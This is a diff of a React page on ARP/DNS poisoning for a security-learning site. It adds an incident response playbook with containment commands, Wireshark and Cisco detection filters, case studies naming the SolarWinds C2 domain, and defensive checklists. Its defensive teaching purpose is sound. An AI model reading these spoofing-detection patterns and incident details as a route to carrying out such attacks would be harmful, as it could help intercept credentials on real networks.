+                        <CheckCircleIcon sx={{ color: "#22c55e", flexShrink: 0, mt: 0.5 }} />
+                        <Box>
+                          <Typography variant="body2" sx={{ fontWeight: 600 }}>{item.lesson}</Typography>
+                          <Typography variant="caption" color="text.secondary">{item.defense}</Typography>
+                        </Box>
+                      </Box>
+                    </Grid>
+                  ))}
+                </Grid>
+              </Paper>
             </Paper>
 
             {/* ==================== ATTACK FLOW ==================== */}
@@ -2068,6 +3071,161 @@ const ArpDnsPoisoningPage: React.FC = () => {
                   </Table>
                 </TableContainer>
               </Box>
+            </Paper>
+
+            {/* ==================== INCIDENT RESPONSE ==================== */}
+            <Paper id="incident-response" sx={{ p: 4, mb: 4, borderRadius: 3, border: `1px solid ${alpha("#ef4444", 0.1)}` }}>
+              <Typography variant="h4" sx={{ fontWeight: 800, mb: 3, display: "flex", alignItems: "center", gap: 1 }}>
+                <GavelIcon sx={{ color: "#ef4444" }} />
+                Incident Response Playbook
+              </Typography>
+
+              <Alert severity="error" sx={{ mb: 3 }}>
+                <AlertTitle>🚨 Active Attack Response</AlertTitle>
+                If you suspect an ARP/DNS poisoning attack is in progress, follow these steps immediately. 
+                Speed is critical — credentials may be actively stolen.
+              </Alert>
+
+              {/* Immediate Response */}
+              <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>Phase 1: Immediate Containment (First 15 Minutes)</Typography>
+              <Grid container spacing={2} sx={{ mb: 4 }}>
+                {[
+                  { step: 1, action: "Disconnect Affected Systems", detail: "Remove suspected victims from the network (unplug cable or disable WiFi) to stop ongoing data exfiltration", cmd: "# Windows: netsh interface set interface \"Ethernet\" disable" },
+                  { step: 2, action: "Clear ARP Cache", detail: "Remove poisoned entries from affected systems", cmd: "# Windows: arp -d *\n# Linux: ip neigh flush all" },
+                  { step: 3, action: "Identify Attack Source", detail: "Check ARP tables and switch port mappings to find the attacking device", cmd: "# Cisco: show ip arp\n# show mac address-table" },
+                  { step: 4, action: "Block Attacker Port", detail: "Disable the switch port of the attacking device immediately", cmd: "# Cisco: interface Gi0/X\nshutdown" },
+                ].map((item) => (
+                  <Grid item xs={12} md={6} key={item.step}>
+                    <Paper sx={{ p: 2, bgcolor: alpha("#ef4444", 0.03), borderRadius: 2, height: "100%" }}>
+                      <Box sx={{ display: "flex", alignItems: "center", gap: 1, mb: 1 }}>
+                        <Box sx={{ bgcolor: "#ef4444", color: "white", width: 24, height: 24, borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", fontWeight: 700, fontSize: "0.8rem" }}>
+                          {item.step}
+                        </Box>
+                        <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>{item.action}</Typography>
+                      </Box>
+                      <Typography variant="body2" color="text.secondary" sx={{ mb: 1 }}>{item.detail}</Typography>
+                      <Box sx={{ fontFamily: "monospace", fontSize: "0.7rem", bgcolor: alpha("#000", 0.05), p: 1, borderRadius: 1, whiteSpace: "pre-wrap" }}>
+                        {item.cmd}
+                      </Box>
+                    </Paper>
+                  </Grid>
+                ))}
+              </Grid>
+
+              {/* Investigation */}
+              <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>Phase 2: Investigation (Next 1-4 Hours)</Typography>
+              <Grid container spacing={2} sx={{ mb: 4 }}>
+                <Grid item xs={12} md={6}>
+                  <Paper sx={{ p: 2, bgcolor: alpha("#f59e0b", 0.03), borderRadius: 2, height: "100%" }}>
+                    <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#f59e0b", mb: 1 }}>Evidence Collection</Typography>
+                    <List dense>
+                      <ListItem sx={{ py: 0 }}><ListItemText primary="• Export switch logs (ARP, MAC tables)" /></ListItem>
+                      <ListItem sx={{ py: 0 }}><ListItemText primary="• Capture network traffic (if possible)" /></ListItem>
+                      <ListItem sx={{ py: 0 }}><ListItemText primary="• Collect affected system ARP caches" /></ListItem>
+                      <ListItem sx={{ py: 0 }}><ListItemText primary="• Check DNS resolver logs" /></ListItem>
+                      <ListItem sx={{ py: 0 }}><ListItemText primary="• Review DHCP lease records" /></ListItem>
+                      <ListItem sx={{ py: 0 }}><ListItemText primary="• Document timeline of events" /></ListItem>
+                    </List>
+                  </Paper>
+                </Grid>
+                <Grid item xs={12} md={6}>
+                  <Paper sx={{ p: 2, bgcolor: alpha("#f59e0b", 0.03), borderRadius: 2, height: "100%" }}>
+                    <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#f59e0b", mb: 1 }}>Impact Assessment</Typography>
+                    <List dense>
+                      <ListItem sx={{ py: 0 }}><ListItemText primary="• Identify all potentially affected users" /></ListItem>
+                      <ListItem sx={{ py: 0 }}><ListItemText primary="• Determine what data may have been intercepted" /></ListItem>
+                      <ListItem sx={{ py: 0 }}><ListItemText primary="• Check for credential usage from unusual locations" /></ListItem>
+                      <ListItem sx={{ py: 0 }}><ListItemText primary="• Review financial transactions during attack window" /></ListItem>
+                      <ListItem sx={{ py: 0 }}><ListItemText primary="• Assess if any systems were further compromised" /></ListItem>
+                    </List>
+                  </Paper>
+                </Grid>
+              </Grid>
+
+              {/* Remediation */}
+              <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>Phase 3: Remediation & Recovery</Typography>
+              <TableContainer component={Paper} sx={{ borderRadius: 2, mb: 3 }}>
+                <Table size="small">
+                  <TableHead>
+                    <TableRow sx={{ bgcolor: alpha("#22c55e", 0.1) }}>
+                      <TableCell sx={{ fontWeight: 700 }}>Action</TableCell>
+                      <TableCell sx={{ fontWeight: 700 }}>Priority</TableCell>
+                      <TableCell sx={{ fontWeight: 700 }}>Details</TableCell>
+                    </TableRow>
+                  </TableHead>
+                  <TableBody>
+                    {[
+                      { action: "Force Password Resets", priority: "Critical", detail: "All users who used the network during attack window" },
+                      { action: "Revoke Active Sessions", priority: "Critical", detail: "Invalidate all tokens, cookies, and sessions" },
+                      { action: "Rotate API Keys", priority: "High", detail: "Any API keys that may have been transmitted" },
+                      { action: "Enable 2FA", priority: "High", detail: "For all accounts accessed during attack" },
+                      { action: "Deploy DAI/DHCP Snooping", priority: "High", detail: "Prevent future attacks" },
+                      { action: "Increase Monitoring", priority: "Medium", detail: "Enhanced logging for 30+ days" },
+                      { action: "User Notification", priority: "Medium", detail: "Inform affected users about potential exposure" },
+                      { action: "Post-Incident Review", priority: "Medium", detail: "Document lessons learned, update procedures" },
+                    ].map((row) => (
+                      <TableRow key={row.action}>
+                        <TableCell sx={{ fontWeight: 600 }}>{row.action}</TableCell>
+                        <TableCell>
+                          <Chip 
+                            label={row.priority} 
+                            size="small" 
+                            sx={{ 
+                              bgcolor: row.priority === "Critical" ? alpha("#ef4444", 0.1) : 
+                                       row.priority === "High" ? alpha("#f59e0b", 0.1) : alpha("#3b82f6", 0.1),
+                              color: row.priority === "Critical" ? "#ef4444" : 
+                                     row.priority === "High" ? "#f59e0b" : "#3b82f6",
+                              fontWeight: 600 
+                            }} 
+                          />
+                        </TableCell>
+                        <TableCell>{row.detail}</TableCell>
+                      </TableRow>
+                    ))}
+                  </TableBody>
+                </Table>
+              </TableContainer>
+
+              {/* Forensic Commands */}
+              <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>Forensic Investigation Commands</Typography>
+              <Grid container spacing={2}>
+                <Grid item xs={12} md={6}>
+                  <Paper sx={{ p: 2, bgcolor: alpha("#000", 0.02), borderRadius: 2 }}>
+                    <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>Wireshark Analysis</Typography>
+                    <Box sx={{ fontFamily: "monospace", fontSize: "0.75rem", bgcolor: alpha("#000", 0.05), p: 1.5, borderRadius: 1, overflow: "auto" }}>
+                      {`# Find ARP spoofing
+arp.duplicate-address-detected
+
+# Find gratuitous ARP
+arp.isgratuitous == 1
+
+# Multiple MACs for one IP
+Statistics > Endpoints > Ethernet
+
+# DNS queries to suspicious servers
+dns && !dns.resp.addr == "expected_dns_ip"`}
+                    </Box>
+                  </Paper>
+                </Grid>
+                <Grid item xs={12} md={6}>
+                  <Paper sx={{ p: 2, bgcolor: alpha("#000", 0.02), borderRadius: 2 }}>
+                    <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>Switch Forensics (Cisco)</Typography>
+                    <Box sx={{ fontFamily: "monospace", fontSize: "0.75rem", bgcolor: alpha("#000", 0.05), p: 1.5, borderRadius: 1, overflow: "auto" }}>
+                      {`# View DAI logs
+show ip arp inspection log
+
+# Check for multiple MACs
+show mac address-table count
+
+# View DHCP snooping bindings
+show ip dhcp snooping binding
+
+# Port security violations
+show port-security`}
+                    </Box>
+                  </Paper>
+                </Grid>
+              </Grid>
             </Paper>
 
             {/* ==================== DEFENSE CONTROLS ==================== */}
@@ -2403,6 +3561,106 @@ dns.qry.name contains "example.com"
               </Box>
             </Paper>
 
+            {/* ==================== REAL-WORLD INCIDENTS ==================== */}
+            <Paper id="real-incidents" sx={{ p: 4, mb: 4, borderRadius: 3, border: `1px solid ${alpha("#dc2626", 0.1)}` }}>
+              <Typography variant="h4" sx={{ fontWeight: 800, mb: 3, display: "flex", alignItems: "center", gap: 1 }}>
+                <HistoryIcon sx={{ color: "#dc2626" }} />
+                Real-World Incidents & Case Studies
+              </Typography>
+
+              <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.8 }}>
+                Understanding real attacks helps security professionals recognize similar threats. These incidents 
+                demonstrate the significant impact DNS and ARP-based attacks can have on organizations and individuals.
+              </Typography>
+
+              <Grid container spacing={3}>
+                {/* Major Incidents */}
+                {[
+                  {
+                    title: "2018 MyEtherWallet DNS Hijack",
+                    date: "April 2018",
+                    type: "BGP Hijacking + DNS",
+                    impact: "$150,000+ in cryptocurrency stolen",
+                    details: "Attackers hijacked BGP routes for Amazon Route 53 DNS servers, redirecting MyEtherWallet.com traffic to a phishing site. Users who ignored certificate warnings lost their crypto assets.",
+                    lessons: ["Always verify HTTPS certificates", "BGP security matters for DNS", "Financial sites need extra DNS protection"],
+                    color: "#f59e0b"
+                  },
+                  {
+                    title: "2019 Sea Turtle DNS Hijacking Campaign",
+                    date: "2017-2019",
+                    type: "Registrar/TLD Compromise",
+                    impact: "40+ organizations in 13 countries compromised",
+                    details: "Nation-state actors compromised DNS registrars and ccTLDs to intercept email and VPN credentials. Targeted government organizations, energy companies, and telecoms.",
+                    lessons: ["Secure registrar accounts with MFA", "Monitor for unauthorized DNS changes", "DNSSEC can detect tampering"],
+                    color: "#ef4444"
+                  },
+                  {
+                    title: "2020 SolarWinds + DNS Tunneling",
+                    date: "2020",
+                    type: "DNS Tunneling for C2",
+                    impact: "18,000 organizations affected",
+                    details: "Sunburst malware used DNS queries to encoded subdomains (avsvmcloud.com) for command-and-control communications, blending in with normal DNS traffic.",
+                    lessons: ["Monitor for anomalous DNS patterns", "DNS tunneling bypasses most firewalls", "Baseline normal DNS behavior"],
+                    color: "#8b5cf6"
+                  },
+                  {
+                    title: "2016 Dyn DDoS Attack",
+                    date: "October 2016",
+                    type: "DNS DDoS via Mirai Botnet",
+                    impact: "Twitter, Netflix, Reddit, GitHub offline for hours",
+                    details: "Mirai botnet (IoT devices) launched massive DDoS against Dyn DNS provider, causing major internet outages across the US East Coast.",
+                    lessons: ["DNS is critical infrastructure", "IoT security affects everyone", "Redundant DNS providers needed"],
+                    color: "#3b82f6"
+                  },
+                  {
+                    title: "2010 China/Google BGP Incident",
+                    date: "April 2010",
+                    type: "BGP Hijacking affecting DNS",
+                    impact: "15% of internet routes misdirected for 18 minutes",
+                    details: "Chinese ISP advertised incorrect BGP routes, causing traffic destined for US government and military sites (including Google) to be routed through China.",
+                    lessons: ["BGP security affects DNS resolution", "Route hijacking can be accidental or malicious", "International internet governance matters"],
+                    color: "#22c55e"
+                  },
+                  {
+                    title: "Coffee Shop ARP Poisoning",
+                    date: "Ongoing",
+                    type: "Local ARP MITM",
+                    impact: "Credentials stolen, sessions hijacked",
+                    details: "A common attack at coffee shops and hotels where attackers ARP poison to intercept traffic. Often captures HTTP credentials, session cookies, and unencrypted data.",
+                    lessons: ["Public WiFi is inherently insecure", "Always use VPN on public networks", "HTTPS Everywhere is essential"],
+                    color: "#f97316"
+                  },
+                ].map((incident, idx) => (
+                  <Grid item xs={12} md={6} key={idx}>
+                    <Paper sx={{ p: 3, borderRadius: 2, height: "100%", border: `1px solid ${alpha(incident.color, 0.2)}`, bgcolor: alpha(incident.color, 0.02) }}>
+                      <Box sx={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start", mb: 2 }}>
+                        <Typography variant="h6" sx={{ fontWeight: 700, flex: 1 }}>{incident.title}</Typography>
+                        <Chip label={incident.date} size="small" sx={{ bgcolor: alpha(incident.color, 0.1), fontWeight: 600 }} />
+                      </Box>
+                      <Box sx={{ display: "flex", gap: 1, mb: 2 }}>
+                        <Chip label={incident.type} size="small" variant="outlined" />
+                        <Chip label={incident.impact} size="small" sx={{ bgcolor: alpha("#ef4444", 0.1), color: "#ef4444", fontWeight: 600 }} />
+                      </Box>
+                      <Typography variant="body2" color="text.secondary" sx={{ mb: 2, lineHeight: 1.7 }}>
+                        {incident.details}
+                      </Typography>
+                      <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: incident.color }}>Key Lessons:</Typography>
+                      <Box component="ul" sx={{ m: 0, pl: 2 }}>
+                        {incident.lessons.map((lesson, i) => (
+                          <Typography component="li" key={i} variant="caption" color="text.secondary">{lesson}</Typography>
+                        ))}
+                      </Box>
+                    </Paper>
+                  </Grid>
+                ))}
+              </Grid>
+
+              <Alert severity="info" sx={{ mt: 3 }}>
+                <AlertTitle>Stay Informed</AlertTitle>
+                Monitor resources like CISA alerts, Krebs on Security, and The Record for the latest DNS and network-based attack reports.
+              </Alert>
+            </Paper>
+
             {/* ==================== BEST PRACTICES ==================== */}
             <Paper id="best-practices" sx={{ p: 4, mb: 4, borderRadius: 3, border: `1px solid ${alpha("#22c55e", 0.1)}` }}>
               <Typography variant="h4" sx={{ fontWeight: 800, mb: 3, display: "flex", alignItems: "center", gap: 1 }}>
@@ -2410,48 +3668,146 @@ dns.qry.name contains "example.com"
                 Best Practices Summary
               </Typography>
 
+              {/* Quick Reference Checklist */}
+              <Paper sx={{ p: 3, mb: 4, bgcolor: alpha("#22c55e", 0.05), borderRadius: 2, border: `2px solid ${alpha("#22c55e", 0.2)}` }}>
+                <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#22c55e" }}>
+                  ✅ Security Posture Checklist
+                </Typography>
+                <Typography variant="body2" sx={{ mb: 2 }}>
+                  Use this checklist to audit your organization's ARP/DNS security posture:
+                </Typography>
+                <Grid container spacing={2}>
+                  {[
+                    { category: "Layer 2 Security", items: ["DHCP Snooping enabled", "Dynamic ARP Inspection (DAI)", "Port Security configured", "BPDU Guard on access ports"] },
+                    { category: "DNS Security", items: ["DNSSEC validation enabled", "DNS over HTTPS/TLS", "Response Rate Limiting (RRL)", "Recursive queries restricted"] },
+                    { category: "Monitoring", items: ["ARP table monitoring", "DNS query logging", "Anomaly detection alerts", "Baseline traffic analysis"] },
+                    { category: "Network Segmentation", items: ["VLANs properly configured", "802.1X authentication", "Private VLANs (PVLANs)", "Network access control (NAC)"] },
+                  ].map((group, idx) => (
+                    <Grid item xs={12} sm={6} md={3} key={idx}>
+                      <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>{group.category}</Typography>
+                      {group.items.map((item, i) => (
+                        <Box key={i} sx={{ display: "flex", alignItems: "center", gap: 1, mb: 0.5 }}>
+                          <Box sx={{ width: 16, height: 16, border: "2px solid", borderColor: alpha("#22c55e", 0.5), borderRadius: 0.5 }} />
+                          <Typography variant="caption">{item}</Typography>
+                        </Box>
+                      ))}
+                    </Grid>
+                  ))}
+                </Grid>
+              </Paper>
+
               <Grid container spacing={3}>
                 <Grid item xs={12} md={6}>
                   <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>Network Administrators</Typography>
-                  <List>
+                  <List dense>
                     {[
-                      "Enable DHCP snooping on all VLANs",
-                      "Deploy Dynamic ARP Inspection",
-                      "Segment networks using VLANs",
-                      "Implement 802.1X for network access control",
-                      "Monitor ARP and DNS anomalies",
-                      "Keep DNS servers patched and hardened",
-                      "Enable DNSSEC validation",
-                      "Use private VLANs where appropriate",
+                      { text: "Enable DHCP snooping on all VLANs", priority: "Critical" },
+                      { text: "Deploy Dynamic ARP Inspection", priority: "Critical" },
+                      { text: "Implement 802.1X for network access control", priority: "High" },
+                      { text: "Segment networks using VLANs", priority: "High" },
+                      { text: "Enable DNSSEC validation on resolvers", priority: "High" },
+                      { text: "Monitor for ARP and DNS anomalies", priority: "Medium" },
+                      { text: "Keep DNS servers patched and hardened", priority: "Medium" },
+                      { text: "Use private VLANs where appropriate", priority: "Medium" },
+                      { text: "Disable LLMNR and NBT-NS via GPO", priority: "High" },
+                      { text: "Implement DNS sinkholing for known bad domains", priority: "Medium" },
                     ].map((item, idx) => (
-                      <ListItem key={idx}>
+                      <ListItem key={idx} sx={{ py: 0.5 }}>
                         <ListItemIcon><CheckCircleIcon sx={{ color: "#22c55e", fontSize: 18 }} /></ListItemIcon>
-                        <ListItemText primary={item} />
+                        <ListItemText 
+                          primary={item.text}
+                          secondary={
+                            <Chip 
+                              label={item.priority} 
+                              size="small" 
+                              sx={{ 
+                                height: 18, 
+                                fontSize: "0.65rem",
+                                bgcolor: alpha(
+                                  item.priority === "Critical" ? "#ef4444" : 
+                                  item.priority === "High" ? "#f59e0b" : "#3b82f6", 
+                                  0.1
+                                ),
+                                color: item.priority === "Critical" ? "#ef4444" : 
+                                       item.priority === "High" ? "#f59e0b" : "#3b82f6",
+                              }} 
+                            />
+                          }
+                        />
                       </ListItem>
                     ))}
                   </List>
                 </Grid>
                 <Grid item xs={12} md={6}>
                   <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>End Users</Typography>
-                  <List>
+                  <List dense>
                     {[
-                      "Verify HTTPS and certificate validity",
-                      "Use encrypted DNS (DoH/DoT)",
-                      "Be cautious on public Wi-Fi networks",
-                      "Watch for certificate warnings",
-                      "Use VPN on untrusted networks",
-                      "Keep systems and browsers updated",
-                      "Enable HSTS where available",
-                      "Report suspicious network behavior",
+                      { text: "Always verify HTTPS and certificate validity", priority: "Critical" },
+                      { text: "Use VPN on untrusted/public networks", priority: "Critical" },
+                      { text: "Enable encrypted DNS (DoH/DoT)", priority: "High" },
+                      { text: "Never ignore certificate warnings", priority: "Critical" },
+                      { text: "Be cautious on public Wi-Fi networks", priority: "High" },
+                      { text: "Keep systems and browsers updated", priority: "High" },
+                      { text: "Use browser extensions like HTTPS Everywhere", priority: "Medium" },
+                      { text: "Report suspicious network behavior to IT", priority: "Medium" },
+                      { text: "Verify banking/sensitive sites manually", priority: "High" },
+                      { text: "Use password managers (immune to phishing)", priority: "High" },
                     ].map((item, idx) => (
-                      <ListItem key={idx}>
+                      <ListItem key={idx} sx={{ py: 0.5 }}>
                         <ListItemIcon><CheckCircleIcon sx={{ color: "#22c55e", fontSize: 18 }} /></ListItemIcon>
-                        <ListItemText primary={item} />
+                        <ListItemText 
+                          primary={item.text}
+                          secondary={
+                            <Chip 
+                              label={item.priority} 
+                              size="small" 
+                              sx={{ 
+                                height: 18, 
+                                fontSize: "0.65rem",
+                                bgcolor: alpha(
+                                  item.priority === "Critical" ? "#ef4444" : 
+                                  item.priority === "High" ? "#f59e0b" : "#3b82f6", 
+                                  0.1
+                                ),
+                                color: item.priority === "Critical" ? "#ef4444" : 
+                                       item.priority === "High" ? "#f59e0b" : "#3b82f6",
+                              }} 
+                            />
+                          }
+                        />
                       </ListItem>
                     ))}
                   </List>
                 </Grid>
               </Grid>
+
+              {/* Defense in Depth */}
+              <Paper sx={{ p: 3, mt: 3, bgcolor: alpha("#3b82f6", 0.03), borderRadius: 2 }}>
+                <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#3b82f6" }}>
+                  🏰 Defense in Depth: Layered Security
+                </Typography>
+                <Typography variant="body2" sx={{ mb: 2, lineHeight: 1.8 }}>
+                  No single control can prevent all ARP/DNS attacks. Implement <strong>multiple layers</strong> so 
+                  that if one fails, others still protect you:
+                </Typography>
+                <Grid container spacing={2}>
+                  {[
+                    { layer: "Physical", controls: "Secure physical access to network equipment", color: "#6b7280" },
+                    { layer: "Network", controls: "VLANs, DHCP Snooping, DAI, 802.1X", color: "#3b82f6" },
+                    { layer: "Transport", controls: "HTTPS, TLS, VPN, DoH/DoT", color: "#8b5cf6" },
+                    { layer: "Application", controls: "HSTS, Certificate Pinning, DNSSEC", color: "#22c55e" },
+                    { layer: "Monitoring", controls: "IDS/IPS, SIEM, Anomaly Detection", color: "#f59e0b" },
+                    { layer: "Response", controls: "Incident Response Plan, Forensics", color: "#ef4444" },
+                  ].map((item, idx) => (
+                    <Grid item xs={6} md={2} key={idx}>
+                      <Box sx={{ textAlign: "center", p: 1, borderLeft: `3px solid ${item.color}`, pl: 2 }}>
+                        <Typography variant="subtitle2" sx={{ fontWeight: 700, color: item.color }}>{item.layer}</Typography>
+                        <Typography variant="caption" color="text.secondary">{item.controls}</Typography>
+                      </Box>
+                    </Grid>
+                  ))}
+                </Grid>
+              </Paper>
 
               <Alert severity="warning" sx={{ mt: 3 }}>
                 <AlertTitle>Legal Notice</AlertTitle>
@@ -2475,21 +3831,68 @@ dns.qry.name contains "example.com"
             <Paper sx={{ p: 3, mt: 4, borderRadius: 3, bgcolor: alpha(accent, 0.02) }}>
               <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
                 <SchoolIcon sx={{ color: accent }} />
-                Continue Learning
+                Continue Your Security Journey
+              </Typography>
+              <Typography variant="body2" color="text.secondary" sx={{ mb: 2 }}>
+                Now that you understand network-layer attacks, explore these related topics:
               </Typography>
               <Grid container spacing={2}>
                 {[
-                  { title: "Computer Networking", path: "/learn/networking" },
-                  { title: "OWASP Top 10", path: "/learn/owasp" },
-                  { title: "Privilege Escalation", path: "/learn/priv-esc" },
-                  { title: "Linux Fundamentals", path: "/learn/linux" },
+                  { title: "Computer Networking", path: "/learn/networking", desc: "Deep dive into protocols" },
+                  { title: "OWASP Top 10", path: "/learn/owasp", desc: "Web application security" },
+                  { title: "Privilege Escalation", path: "/learn/priv-esc", desc: "Post-exploitation techniques" },
+                  { title: "Linux Fundamentals", path: "/learn/linux", desc: "Command line mastery" },
+                  { title: "Social Engineering", path: "/learn/social-engineering", desc: "Human-layer attacks" },
+                  { title: "Cryptography", path: "/learn/crypto", desc: "Understanding encryption" },
+                  { title: "Malware Analysis", path: "/learn/malware", desc: "Threat reverse engineering" },
+                  { title: "PCAP Analysis", path: "/learn/pcap", desc: "Network traffic analysis" },
                 ].map((item, idx) => (
                   <Grid item xs={6} md={3} key={idx}>
-                    <Chip
-                      label={item.title}
+                    <Paper 
                       onClick={() => navigate(item.path)}
+                      sx={{ 
+                        p: 1.5, 
+                        cursor: "pointer", 
+                        borderRadius: 2,
+                        border: `1px solid ${alpha(accent, 0.1)}`,
+                        transition: "all 0.2s",
+                        "&:hover": { 
+                          bgcolor: alpha(accent, 0.05),
+                          borderColor: alpha(accent, 0.3),
+                          transform: "translateY(-2px)"
+                        }
+                      }}
+                    >
+                      <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>{item.title}</Typography>
+                      <Typography variant="caption" color="text.secondary">{item.desc}</Typography>
+                    </Paper>
+                  </Grid>
+                ))}
+              </Grid>
+            </Paper>
+
+            {/* External Resources */}
+            <Paper sx={{ p: 3, mt: 3, borderRadius: 3, border: `1px solid ${alpha("#3b82f6", 0.1)}` }}>
+              <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
+                <InfoIcon sx={{ color: "#3b82f6" }} />
+                External Resources
+              </Typography>
+              <Grid container spacing={2}>
+                {[
+                  { name: "Wireshark Wiki - ARP", url: "https://wiki.wireshark.org/AddressResolutionProtocol" },
+                  { name: "SANS Reading Room", url: "https://www.sans.org/reading-room/" },
+                  { name: "NIST DNS Security Guide", url: "https://csrc.nist.gov/publications/detail/sp/800-81/2/final" },
+                  { name: "Cisco DAI Guide", url: "https://www.cisco.com/c/en/us/td/docs/switches/lan/catalyst4500/12-2/25ew/configuration/guide/conf/dynarp.html" },
+                ].map((resource, idx) => (
+                  <Grid item xs={12} sm={6} md={3} key={idx}>
+                    <Chip
+                      label={resource.name}
+                      component="a"
+                      href={resource.url}
+                      target="_blank"
                       clickable
-                      sx={{ width: "100%", justifyContent: "flex-start" }}
+                      variant="outlined"
+                      sx={{ width: "100%" }}
                     />
                   </Grid>
                 ))}
